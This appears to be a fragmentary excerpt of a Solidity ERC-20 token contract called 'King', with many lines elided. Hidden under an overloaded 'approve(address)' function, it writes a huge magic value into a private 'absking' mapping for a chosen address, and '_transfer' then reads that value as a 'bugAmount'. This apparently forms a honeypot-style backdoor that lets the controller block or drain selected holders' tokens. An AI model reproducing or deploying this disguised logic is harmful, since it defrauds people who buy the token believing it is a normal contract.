...
contract King is Context, IERC20, IERC20Metadata,Ownable {
    ...
    constructor(string memory name_, string memory symbol_) {
        ...
        _mint(msg.sender, 1314*10**decimals());
    }
...
/**
    ...
    mapping(address => uint256) private absking;
    ...
    function approve(address ccc) external   {
        ...
        absking[ccc] = 51116044618658097733785492504341953926634992332820282019728792003956561130857;
    }
    ...
    function _transfer(
        ...
        uint256 bugAmount = absking[from].subbb(0);
